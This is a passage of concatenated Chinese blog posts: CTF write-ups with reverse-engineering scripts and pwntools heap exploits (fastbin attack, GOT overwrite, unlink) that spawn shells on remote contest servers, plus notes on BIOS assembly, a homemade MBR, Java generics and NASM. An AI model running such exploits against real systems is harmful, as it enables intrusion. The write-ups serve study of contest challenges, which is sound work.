num_list[z] z = z + 1#print num_listnum_list2 = []num_list2.append(num_list[1])num_list2.append(num_list[3])num_list2.append(num_list[0])num_list2.append(num_list[2])num_list2.append(num_list[5])num_list2.append(num_list[7])num_list2.append(num_list[4])num_list2.append(num_list[6])num_list2.append(num_list[9])num_list2.append(num_list[11])num_list2.append(num_list[8])num_list2.append(num_list[10])num_list2.append(num_list[13])num_list2.append(num_list[15])num_list2.append(num_list[12])num_list2.append(num_list[14])num_list2.append(num_list[17])num_list2.append(num_list[19])num_list2.append(num_list[16])num_list2.append(num_list[18])num_list2.append(num_list[21])num_list2.append(num_list[23])num_list2.append(num_list[20])num_list2.append(num_list[22])num = 0for x in num_list2: num = num * 0x100 num = num + xprint hex(num) 由于密钥也被加密了,密钥为四位,爆破得出密钥是flag,解密获得flag. 12345678910#include"xxtea.h"#include&lt;stdio.h&gt;int main() &#123; char buffer[] = &#123;0xbc, 0xa5, 0xce, 0x40, 0xf4, 0xb2, 0xb2, 0xe7, 0xa9, 0x12, 0x9d, 0x12, 0xae, 0x10, 0xc8, 0x5b, 0x3d, 0xd7, 0x6, 0x1d, 0xdc, 0x70, 0xf8, 0xdc&#125;; char key[] = "flag"; size_t len; char * decrypt = (char*)xxtea_decrypt(buffer, 24, key, &amp;len); puts(decrypt);&#125; easyRE第一步解密. 1234567nums = [0x49, 0x6F, 0x64, 0x6C, 0x3E, 0x51, 0x6E, 0x62, 0x28, 0x6F, 0x63, 0x79, 0x7F, 0x79, 0x2E, 0x69, 0x7F, 0x64, 0x60, 0x33, 0x77, 0x7D, 0x77, 0x65, 0x6B, 0x39, 0x7B, 0x69, 0x79, 0x3D, 0x7E, 0x79, 0x4C, 0x40, 0x45, 0x43]x = ""for i in range(36): x += chr(nums[i] ^ i)print x#Info:The first four chars are `flag` 后面是多次base64加密,解密得:https://bbs.pediy.com/thread-254172.htm. 动态调试发现fini里面调用了加密函数,已知明文前四位求出密钥,解密密文获得flag. 12345678910111213m = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]d = "flag"key=[]flag = ""for i in range(len(d)): key += [m[i] ^ ord(d[i])]for i in range(len(m)): flag += chr(m[i] ^ key[i % 4])print flag childRE先打乱,然后UnDecorate,然后一个置换的加密. 先从置换中爆破出UnDecorate后的内容： 1234567891011str1 = "(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;"str2 = "55565653255552225565565555243466334653663544426565555525555222"table = "1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;'ASDFGHJKL:\"ZXCVBNM&lt;&gt;?zxcvbnm,./"m = ""for i in range(62): for j in range(0x20, 0x7f): if (char_set[j % 23] == str1[i]) and (char_set[j // 23] == str2[i]): m += chr(j) print(m) 得到. 1private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *) 构造一个一模一样的类,PS:VS中不调用的方法会被优化. 1234567891011121314151617181920212223class R0Pxx&#123; public: void test() &#123; unsigned char * a1 = nullptr; My_Aut0_PWN(a1); &#125; private: char * My_Aut0_PWN(unsigned char * a1) &#123; return (char *)a1; &#125;&#125;;int main()&#123; R0Pxx demo; demo.test(); return 0;&#125; VS自带的dumpbin工具可以输出符号. 1dumpbin.exe /symbols C:\Users\w4rd3n\source\repos\Project2\x64\Debug\Project2.obj | grep My_Aut0_PWN 最后复原?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z获得flag. 123456789101112import hashliba = "?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z"idx = [30, 14, 29, 6, 13, 21, 28, 2, 5, 9, 12, 17, 20, 24, 27, 0, 1, 3, 4, 7, 8, 10, 11, 15, 16, 18, 19, 22, 23, 25, 26]res = ''for i in idx: res += a[i]res = a.encode()flag = hashlib.md5(res).hexdigest()print(flag) Snake使用ILSpy逆向Assembly-CSharp.dll,发现游戏主体调用Interface.dll,使用IDA逆向.查找String发现关键函数GameObject.其参数(Unity中)是坐标,尝试爆破. 12345678910111213141516171819202122232425262728#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;libloaderapi.h&gt;int main()&#123; const char* funcName = "GameObject"; HMODULE hDLL = LoadLibrary(L"C:\\Users\\w4rd3n\\Desktop\\RedHat\\Snake\\Snake_Data\\Plugins\\Interface.dll"); if (hDLL != NULL) &#123; typedef int (*funcptr)(int); funcptr func = (funcptr)GetProcAddress(hDLL, funcName); if (func != NULL) &#123; for (int i = 0; i &lt; 100; i++) &#123; signed int res = func(i); printf("%d: %d\n", i, res); &#125; &#125; else &#123; printf("no func\n"); &#125; &#125; else &#123; printf("load fail\n"); &#125; getchar(); return 0;&#125; cryptoBroadcast解压,打开py文件即刻获取flag. misc恶臭的数据包 得到附件使用wireshark打开流量包,发现是一个无线流量包. 把数据包丢进kali使用aircrack-ng进行分析为WPA协议,破解密码:12345678. 导入密码到wireshark然后重新用wireshark打开流量包过滤剩下http协议的流量包发现三个上传图片的流量. 使用binwalk分解图片,得到一个压缩包和一个flag.txt,但是无解. 发现cookies部分有点像base64遂解密发现是JWT认证,解密后得到hint提示要找到ping过的一个网站. 重新查看wireshark拿到26rsfb.dnslog.cn. 成功解压压缩包得到flag{f14376d0-793e-4e20-9eab-af23f3dc158}.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hxb-2019-quals]]></title>
    <url>%2Fposts%2F1ececfa4%2F</url>
    <content type="text"><![CDATA[HackNoteedit的时候用了strlen,off_by_one. 堆重叠后fastbin attack,设计size分配到main_arena,修改unsort bin,再次分配修改malloc_hook到shellcode. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *malloc_hook = 0x6CB788free_hook = 0x6CD5E8context.log_level = 'debug'context(os="linux", arch="amd64")def add(size, content): r.sendline("1") r.sendlineafter("Input the Size:\n", str(size)) r.sendafter("Input the Note:\n", content) r.recvuntil("4. Exit\n-----------------\n")def dele(index): r.sendline("2") r.sendlineafter("Input the Index of Note:\n", str(index)) r.recvuntil("4. Exit\n-----------------\n")def edit(index, content): r.sendline("3") r.sendlineafter("Input the Index of Note:\n", str(index)) r.sendafter("Input the Note:\n", content) r.recvuntil("4. Exit\n-----------------\n")#r = process("./HackNote")r = remote("183.129.189.62", "17104")r.recvuntil("4. Exit\n-----------------\n")add(0x108, "a\n")#0add(0x200, "a" * 0x1f0 + p64(0x200) + "\n")#1add(0x100, "a\n")#2add(0x100, "a\n")#3edit(0, "a" * 0x108)dele(1)edit(0, "a" * 0x108 + "\n")add(0xc0, "a\n")#1add(0x50, "a\n")#4add(0x60, "a\n")#5dele(1)dele(2)add(0x300, "a\n")#1dele(4)dele(5)edit(1, "a" * 0xc8 + p64(0x60) + p64(0x71) + p64(0) * 10 + p64(0x71) + p64(0x6cb820) + "\n")add(0x50, "a\n")#2add(0x60, "a\n")#4add(0x60, p64(0) * 5 + p64(0x6CB788 - 0x10) + "\n")#4add(0x60, p64(0x6cb790) + asm(shellcraft.sh()) + "\n")#4r.sendline("1")r.sendlineafter("Input the Size:\n", str(1))#gdb.attach(r)r.interactive() NameSystem填满指针数组后可double free进行fastbin attack. 先修改一个堆指针为got表项,然后修改free@got为puts@plt,同时设计一个size准备下一次fastbin attack. 泄露地址,再次修改free@got为system,获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *def add(size, content): r.sendline("1") r.sendlineafter("Name Size:", str(size)) r.sendlineafter("Name:", content) r.recvuntil("Your choice :\n")def dele(index): r.sendline("3") r.sendlineafter("The id you want to delete:", str(index)) r.recvuntil("Your choice :\n")#r = process("./NameSystem")r = remote("183.129.189.62", "15505")r.recvuntil("Your choice :\n")for i in range(18): add(0x40, "a")add(0x60, "a")add(0x60, "a")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x50, "a")add(0x50, "a")dele(0)dele(18)dele(17)dele(19)dele(0)add(0x30, "a")add(0x30, "a")dele(0)dele(18)dele(17)dele(19)for i in range(13): dele(0)add(0x60, p64(0x60208d))add(0x60, p64(0))add(0x60, "/bin/sh\x00")add(0x60, "\x00" * 3 + p64(0x602060))add(0x50, p64(0x601ffa))add(0x50, p64(0))add(0x50, "/bin/sh\x00")add(0x50, "\x00" * 6 + p64(0x41) + p32(0x4006A0) + "\x00" * 3)r.sendline("3")r.sendlineafter("The id you want to delete:", str(0))libc = u64(r.recvuntil("\n").ljust(8, "\x00")) + 0x7fb44b795000 - 0xa7fb44b7cbe80add(0x30, p64(0x602008))add(0x30, p64(0))add(0x30, "/bin/sh\x00")add(0x30, p64(libc + 0x45390)[:7])r.sendline("3")r.sendlineafter("The id you want to delete:", str(15))#gdb.attach(r)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-IA32-BIOS编程]]></title>
    <url>%2Fposts%2F4c22bf0c%2F</url>
    <content type="text"><![CDATA[概览BIOS支持基本的键盘,鼠标等输入设备,也支持基本的显示输出和打印操作,还有读写外部存储设备. 键位与扫描码键盘上的键可以分为五类:字符键(字母,数字,标点等),功能键(如F1,PgUp等),控制键(Ctrl,Alt和左右Shift),双态键(如Num Lock和Caps Lock等),特殊请求键(如Print Screen等). 其中字符键有对应的ASCII码,其他的键没有.每个键都有一个代表键位置的扫描码.当按键操作发送,键盘会发送扫描码到主机. 键盘中断程序根据扫描码进行处理:对于字符键会把扫描码与ASCII码存到键盘缓冲区,对于功能键会把扫描码存到键盘缓冲区,对于控制键和双态键仅会记住状态,而对于特殊请求键会直接处理. 键盘I/O程序BIOS中提供键盘输入功能的程序叫做键盘I/O程序,通过编号(置于AH寄存器)调用程序(INT 16H)不同的功能,调用返回后,从有关寄存器获取出口参数(返回值). 12345678MOV AH, 0INT 16H;读取键盘缓冲区,AL为ASCII码(功能键ASCII码为0),AH为扫描码.无字符时等待.MOV AH, 1INT 16H;ZF=1表示键盘缓冲区含有键码,ZF=0表示无.MOV AH, 2INT 16H;AL=变换键状态字节 变换键状态字节. 0位:为1表示按下右Shift. 1位:为1表示按下左Shift. 2位:为1表示按下控制键CTRL. 3位:为1表示按下替换键ALT. 4位:为1表示Scroll Lock状态已变换. 5位:为1表示Num Lock状态已变换. 6位:为1表示Caps Lock状态已变换. 7位:为1表示Insert状态已变换. 显示I/O程序现在基本上都是使用图像显示方式,最经典的文本显示模式是25行80列(2000字符). BIOS中提供显示输出功能的程序叫做显示I/O程序,通过编号(置于AH寄存器)调用程序(INT 10H)不同的功能,入口参数和出口参数置于有关寄存器. 在屏幕上显示的字符代码及其属性被依次保存在显示缓冲区中.可以认为显示页号是现实缓冲区的编号,可通过五号功能选择当前页,默认使用第0页. 1234567891011121314151617181920212223242526272829303132333435MOV BH, 2;显示页号MOV DH, 2;行号MOV DL, 2;列号MOV AH, 2;INT 10H;置输出光标位置MOV BH, 2;显示页号MOV AH, 3;INT 10H;读光标位置,CH=光标开始行,CL=光标结束行,DH=行号,DL=列号.MOV AL, 2;新页号MOV AH, 5;INT 10H;选择当前显示页MOV BH, 2;显示页号MOV AH, 8;INT 10H;读取光标位置处的字符和属性MOV BH, 2;显示页号MOV AL, 2;字符代码MOV BL, 2;属性MOV CX, 2;字符重复次数MOV AH, 9;INT 10H;输出,但光标不移动MOV BH, 2;显示页号MOV AL, 2;字符代码MOV CX, 2;字符重复次数MOV AH, 10;INT 10H;输出,但光标不移动,不带属性MOV BH, 2;显示页号MOV AL, 2;字符代码MOV AH, 14;INT 10H;TTY方式显示,光标处显示字符并后移光标,解释回车,换行,退格和响铃等控制符. 磁盘读写BIOS中提供磁盘读写功能的程序叫做磁盘I/O程序,通过编号(置于AH寄存器)调用程序(INT 13H)不同的功能,入口参数和出口参数置于有关寄存器. 早期PC有两个软盘驱动器A,B盘,所以硬盘从C开始编号. 12345678910111213141516171819MOV DL, 80H;驱动器号,80H表示C盘,81H代表D盘MOV AX, 0MOV ES, AXMOV BX, 7C00H;ES:BX=缓冲区起始地址MOV DH, 0;磁头号MOV CH, 0;柱面号MOV CL, 1;扇区号MOV AL, 1;读取的扇区个数MOV AH, 2;读取磁盘内容INT 13HJC Error;CF反映操作是否成功(0表示成功),不成功时AH为出错状态代码.;实际上柱面号为CH内容组成低8位,CL高2位组成高2位,共10位.扇区号为CL低6位组成.;写磁盘只需要修改调用号为3MOV DL, 80HMOV AH, 0;磁盘系统复位INT 13H;CF反映操作是否成功(0表示成功),不成功时AH为出错状态代码. 主引导记录MBR是位于启动磁盘首个扇区(LBA编址逻辑块号为0,CHS编址0 0 1的扇区)的引导程序(512字节,由主引导程序446字节,磁盘分区表64字节,标记2字节(55,AA)组成). PC启动完成加电自检后,BIOS将按照预定的启动顺序读取MBR到0000:7C00H内存区域,并转到主引导程序执行. MBR通常负责将操作系统的引导程序装载到内存,并转到操作系统的引导程序,由操作系统完成自举. 主引导程序执行的主要步骤. 自身腾挪.由于操作系统的引导程序将占据0000:7C00H,所以MBR要先移动自己的代码. 识别活动分区.根据磁盘分区表找到要启动的操作系统所在的分区. 加载位于活动分区的操作系统的引导程序. 跳转到操作系统的引导程序. 自制简易MBR. 12345678nasm.exe loader.asm -f bin -o loader#编译成bindd if=loader of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 count=1 conv=notrunc#写入到对应扇区nasm.exe program.asm -f bin -o programdd if=program of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 seek=50 count=1 conv=notruncnasm.exe break.asm -f bin -o breakdd if= break of="C:\Users\w4rd3n\VirtualBox VMs\asm\asm.vhd" bs=512 seek=100 count=1 conv=notrunc 源代码. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181;loader.asmSig EQU 0 ;子程序头部签名Len EQU 4 ;子程序长度Entry EQU 6 ;子程序入口MyLow EQU 1000H ;子程序使用的内存区的段值的最小值MyHigh EQU 9000H ;子程序使用的内存区的段值的最大值MyBuffer EQU 07E0H ;用于读取首个扇区的缓冲区的段值,后面的扇区直接传送到目标扇区section textbits 16org 7C00HStart:MOV AX, 0 CLIMOV SS, AXMOV SP, 7C00HSTIL1:CLDPUSH CSPUSH DSMOV AX, CSMOV DS, AXMOV AX, MyBufferMOV ES, AXMOV DX, mess0CALL PutStrCALL GetCharCALL PutCharCMP AL, 30HJZ EndCMP AL, 32HJA Error4CMP AL, 31HJNZ L8MOV AL, 50JMP L9L8:MOV AL, 100L9:MOV [DiskAP + 8], ALCALL ReadSecJC Error1CMP DWORD [ES:Sig], "Iadc"JNZ Error2MOV CX, [ES:Len]CMP CX, 0JZ Error3ADD CX, 511SHR CX, 9MOV AX, [ES:Entry + 2]CMP AX, MyLowJB L2CMP AX, MyHighJB L3L2:MOV AX, MyLowL3:MOV WORD [DiskAP + 6], AXMOV ES, AXXOR DI, DIPUSH DSPUSH MyBufferPOP DSXOR SI, SIPUSH CXMOV CX, 128REP MOVSDPOP CXPOP DSDEC CXJZ L5L4:ADD WORD [DiskAP + 6], 20HINC DWORD [DiskAP + 8]CALL ReadSecJC Error1LOOP L4L5:MOV [ES:Entry + 2], ESCALL FAR [ES:Entry]JMP L1Error1:MOV DX, Error1_mesCALL PutStrJMP L1Error2:MOV DX, Error2_mesCALL PutStrJMP L1Error3:MOV DX, Error3_mesCALL PutStrJMP L1Error4:MOV DX, Error4_mesCALL PutStrJMP L1End:MOV DX, End_mesCALL PutStrHalt:HLTJMP SHORT HaltReadSec:PUSH DXPUSH SIMOV SI, DiskAPMOV DL, 80HMOV AH, 42HINT 13HPOP SIPOP DXRETGetChar:MOV AH, 0INT 16HRETPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RET;---------------------------;磁盘地址包DiskAP:DB 10H ;DAP尺寸DB 0 ;保留DW 1 ;扇区数DW 0 ;缓冲区偏移DW MyBuffer ;缓冲区段值DD 0 ;起始扇区号LBA的低4字节DD 0 ;起始扇区号LBA的高4字节mess0 db "0. Halt", 0DH, 0AH, "1. program", 0DH, 0AH, "Input your choice:", 0Error1_mes db 0DH, 0AH, "Invaild sector", 0DH, 0AH, 0Error2_mes db 0DH, 0AH, "Error Sig", 0DH, 0AH, 0Error3_mes db 0DH, 0AH, "Error Len", 0DH, 0AH, 0Error4_mes db 0DH, 0AH, "Error Choice", 0DH, 0AH, 0End_mes db 0DH, 0AH, "Halt...", 0times 510 - ($ - $$) db 0db 55h, 0aah 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121;break.asmSig db "Iadc"Len dw End_textEntry dw StartMySeg dw 6660HPad dd 0Start:MOV AX, 0MOV DS, AXCLIMOV AX, [9 * 4]PUSH AXMOV AX, [9 * 4 + 2]PUSH AXMOV WORD [9 * 4], my_int09h_handleMOV [9 * 4 + 2], CSSTIMOV AX, CSMOV DS, AXTest:MOV AH, 0INT 16HCMP AL, 0DHJZ LLCLDMOV DX, mess0CALL PutStrJMP TestLL:MOV AX, 0MOV DS, AXCLIPOP AXMOV [9 * 4 + 2], AXPOP AXMOV [9 * 4 + 2], AXSTIRETFmy_int09h_handle:PUSHAMOV AL, 0ADHOUT 0x64, ALIN AL, 0x60STICALL my_int09h_funCLIMOV AL, 0AEHOUT 0x64, ALMOV AL, 20HOUT 20H, ALPOPAIRETmy_int09h_fun:CMP AL, 1CHJNZ L1MOV AH, ALMOV AL, 0DHCALL SaveJMP ExitL1:MOV AH, ALMOV AL, 30HCALL SaveExit:RETSave:PUSH DSMOV BX, 40HMOV DS, BXMOV BX, [001CH]MOV SI, BXADD SI, 2CMP SI, 003EHJB L2MOV SI, 001EHL2:CMP SI, [001AH]JZ L3MOV [BX], AXMOV [001CH], SIL3:POP DSRETPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RETmess0 db 0DH, 0AH, "I am New int 09", 0DH, 0AH, 0End_text: 1234567891011121314151617181920212223242526272829303132333435363738;program.asmSig db "Iadc"Len dw End_textEntry dw StartMySeg dw 2330HPad dd 0Start:MOV AX, CSMOV DS, AXCLDMOV DX, mess0CALL PutStrRETFPutChar:MOV BH, 0MOV AH, 14INT 10HRETPutStr:MOV BH, 0MOV SI, DXL6:LODSBOR AL, ALJZ L7CALL PutCharJMP L6L7:RETmess0 db 0DH, 0AH, "Hello World", 0DH, 0AH, 0End_text:]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-SICP-读后感]]></title>
    <url>%2Fposts%2Fb271bd18%2F</url>
    <content type="text"></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-java-泛型程序设计]]></title>
    <url>%2Fposts%2F93519620%2F</url>
    <content type="text"><![CDATA[泛型类示例Java通过通配符类型来设计一个泛型类或者泛型方法. 123456789101112131415161718public class MyTest&lt;T&gt; &#123; private T a; public MyTest() &#123; a = null; &#125; //code&#125;//codeMyTest&lt;String&gt; a = new MyTest&lt;String&gt;;//codepublic class MyTest2 &#123; //code public static &lt;T&gt; T test(T a) &#123; return a; &#125;&#125;//codeString a = MyTest2.&lt;String&gt;test("aaa"); 可以限定一个泛型类/方法可以实例化的类型. 1234567public class MyTest3 &#123; //code public static &lt;T extend Comparable&gt; T test(T a) &#123; return a; &#125; //限定类型T必须实现Comparable接口 //多个限定条件可以通过&amp;连接 //如果限定条件中包含类则类必须位于限定列表的第一个&#125; Java的泛型类与C++的模板类有本质区别. JVM中没有泛型类,泛型类在编译时会被转换为普通类.这一过程称为类型擦除.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-assembly-IA32-实地址方式]]></title>
    <url>%2Fposts%2F26987864%2F</url>
    <content type="text"><![CDATA[环境推荐使用NASM加32位Windows 7. 实地址方式实地址方式可以访问8个32位通用寄存器,但EIP,ESP,EFLAGS都只有低16位起作用.实地址方式下处理器的基本执行环境和基本指令集与保护方式是相同的.不过间接寻址中不能使用比例因子. NASM编程NASM大小写敏感. 12345NASM 1.asm -o 1.com#COM程序会从段内偏移100H开始执行,因为COM为纯二进制文件NASM 1.asm -f obj -o 1.objLINK 1.obj;#生成exe程序,从标号..start开始执行 示例. 12345678910111213segment code..start:MOV AH, 1INT 21H;调用系统例程读取键盘输入到ALMOV DL, ALMOV AH, 2INT 21H;调用系统例程输出DLsegment stack stack;显式定义堆栈段,后一个stack为段类型resb 1024;定义1024字节作为堆栈stacktop:;栈底 汇编语句汇编语言有四种语句:指令语句,伪指令语句,宏指令语句,指示语句. 指令:机器指令的符号化,也就是用助记符来编写机器指令,如MOV. 1[标识符:] [指令助记符] [操作数表] [;注释] 伪指令:汇编器定义的指令,用于定义变量,预留存储单元,如$a db &#39;H&#39;, &#39;$&#39;. 伪指令定义符有DB(字节),DW,DD,DQ(64位),参数表通过,分隔. 1[标识符] [伪指令定义符] [参数表] [;注释] 指示:汇编器定义的指令,用于指示汇编器如何生成目标代码,如segment a. 汇编标识符由字母,数字及一些特定字符(-,$,#,@,~,.,?,_)等组成,只有字母,.,_,?可以作为标识符开头. NASM支持未初始化变量,对应伪指令定义符为RESB,RESW,RESD.如buf resb 100,buf指向的内存空间就预留了100字节. NASM提供常数符号化伪指令.如a EQU 100. NASM支持重复汇编前缀TIMES.如TIMES 6 MOVSB,这里会生成六条MOVSB指令. NASM支持两个特殊的符号,$和$$,$的值未当前指令的偏移,$$为当前段在整个程序的偏移. NASM支持四种常数:整数,字符,字符串和浮点数. 整数:无后缀表示十进制,后缀H/h表示十六进制,后缀D/d表示十进制,后缀Q/q和O/o表示八进制,后缀B/b表示二进制.前缀0x也表示十六进制. 字符:字符常数可以是使用单引号或双引号包围的若干字符,最多四个(32位数据),前面的字符占用低地址. 字符串:与字符类似,当可以包含更多字符. NASM同时支持表达式中使用运算符,如:|,^,&amp;,&gt;&gt;,&lt;&lt;,+,-,*,/(无符号除),//(有符号除),%(无符号模),%%(有符号模),!,~,seg(获取段值). 段声明语句:section/segment code [type] [;comment]. 段间跳转:JMP code:seg1.由于实方式下指令地址实际为CS:IP,所以段间跳转需要指明段名,或者使用FAR类型符,JMP FAR seg1. 对应的过程调用与返回指令格式:CALL code:seg1(CALL FAR seg1),RETF(调用时会将段值和偏移都压栈),RETF count(返回同时使SP加count). 段模式声明语句:BITS 32,BITS 16.用于切换NASM当前汇编的段模式. 宏指令:与高级语言的宏意义相同.在宏中可以使用%%前缀声明局部标号. 12345678910111213141516171819202122232425%macro getChar 0 MOV AH, 1 INT 21H%endmacro%define move MOV%idefine i 200;大小写不敏感%macro dbmess 2 mess%1 db %2, 0DH, 0AH, '$'%endmacro;使用参数拼接获得新的符号%macro d2mess 2 mess%&#123;1&#125;1 db %2, '$'%endmacro%macro CMOV 3 J%-1 %%SKIP MOV %2, %3%%SKIP%endmacro;%+1表示参数为条件码,%-1表示参数为条件码,且拼接使用相反的条件码.]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-dhbctf-2019-quals]]></title>
    <url>%2Fposts%2F1d8fb5d%2F</url>
    <content type="text"><![CDATA[boring_heapabs函数经典漏洞:abs(0x800000000) = 0x800000000,update修改size和presize制造unsortedbin泄露堆地址. 然后就可以利用堆重叠进行fastbin attack将fake_size填入fastbin,然后malloc到main_arena中,修改top_chunk从而malloc到malloc_hook. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level = 'debug'def add(choice, content): r.sendline("1") r.sendlineafter("Large\n", str(choice)) r.sendafter("Content:\n", content) r.recvuntil("5.Exit")def update(index, offset, content): r.sendline("2") r.sendlineafter("update?\n", str(index)) r.sendlineafter("update?\n", str(offset)) r.sendafter("Content:\n", content) r.recvuntil("5.Exit")def dele(index): r.sendline("3") r.sendlineafter("delete?\n", str(index)) r.recvuntil("5.Exit")def view(index): r.sendline("4") r.sendlineafter("view?\n", str(index)) data = r.recvline() data += r.recvline()[:-1] r.recvuntil("5.Exit") return datar = process('./pwn')#r = remote("8sdafgh.gamectf.com", "10001")add(3, "/bin/sh\n")#0add(2, "a\n")#1add(3, "a\n")#2add(2, "a\n")#3add(2, "a\n")#4add(2, "a\n")#5update(1, 0x80000000, p64(0) * 3 + p64(0x91 + 0x40) + "\n")dele(1)add(2, "\n")#6libc = u64(view(6)[:6].ljust(8,'\x00')) + 0x7fa5f5663000 - 0x7fa5f5a27c0aadd(3, "a\n")#7add(2, "a\n")#8dele(3)update(8, 0, p64(0x51) + "\n")add(2, "a\n")#9dele(2)update(7, 0, p64(libc + 0x3c4b10 + 0x20) + "\n")add(3, "a\n")add(3, p64(0) * 7 + p64(libc + 0x3c4b10 - 0x10))add(3, p64(libc + 0xf1147) + "\n")print hex(libc)#gdb.attach(r)r.sendline("1")r.sendlineafter("Large\n", str(1))r.interactive() logindouble free堆重叠后,通过login爆破获取libc,然后直接写结构体中的函数指针再次login调用system(&quot;/bin/sh&quot;)即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123from pwn import *context.log_level = 'debug'def login(ids, length, password): r.sendline("1") r.sendlineafter("user id:\n", str(ids)) r.sendlineafter("length:\n", str(length)) r.sendafter("password:\n", password) data = r.recvuntil("5.Exit\n") return datadef register(ids, length, password): r.sendline("2") r.sendlineafter("user id:\n", str(ids)) r.sendlineafter("length:\n", str(length)) r.sendafter("password:\n", password) r.recvuntil("5.Exit\n")def dele(ids): r.sendline("3") r.sendlineafter("user id:\n", str(ids)) r.recvuntil("5.Exit\n")def edit(ids, password): r.sendline("4") r.sendlineafter("user id:\n", str(ids)) r.sendafter("new pass:\n", password) r.recvuntil("5.Exit\n")#r = process("./login")r = remote("8sdafgh.gamectf.com", "20000")r.recvuntil("5.Exit\n")register(0, 0xf8, "a" * 0xf8)register(1, 0x18, "a" * 0x18)dele(0)dele(1)dele(0)register(2, 0x18, "\x20")edit(0, p64(0x100) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0x602050) + p64(0x40089e) + p64(0x100))edit(1, p64(0) * 4 + "/bin/sh\x00")register(2, 0x28, "/bin/sh\x00" + "a" * 0x20)libc = 0x7fedit(0, "a" * 0x10 + "\x45")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 libc = libc % 0x100 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x44")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x43")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x42")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x41")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100 + 0x78edit(0, "a" * 0x10 + "\x40")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc - 0x7f4aa1c84b78 + 0x7f4aa18c0000edit(0, "a" * 0x10 + p64(0x602070) + p64(libc + 0x45390))r.sendline("1")r.sendlineafter("user id:\n", str(2))r.sendlineafter("length:\n", str(0xff))r.sendafter("password:\n", "/bin/sh\x00")print "libc: " + hex(libc)#gdb.attach(r)sleep(1)r.sendline("icq53fedba7ec7cecf0fd369c6e0a6bd")r.interactive() slient_noteuaf导致堆溢出,unlink写got表爆破,1/4096概率调用system(&quot;/bin/sh&quot;). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = 'debug'def add(choice, content): r.sendline("1") r.sendlineafter("add?\n", str(choice)) r.sendlineafter("Content:\n", content) r.recvuntil("4.Exit\n")def dele(choice): r.sendline("2") r.sendlineafter("delete?\n", str(choice)) r.recvuntil("4.Exit\n")def update(choice, content): r.sendline("3") r.sendlineafter("update?\n", str(choice)) r.sendlineafter("Content:\n", content) r.recvuntil("4.Exit\n")while 1: #r = process("./pwn") r = remote("8sdafgh.gamectf.com", "35555") r.recvuntil("4.Exit\n") add(2, p64(0) * 34 + p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)) add(1, "a") dele(2) for i in range(4): add(1, "a") payload = p64(0) + p64(0x81) + p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10) + p64(0) * 10 payload += p64(0) + p64(0x41) payload += p64(0x80) + p64(0x90) update(2, payload) dele(1) #unlink payload = 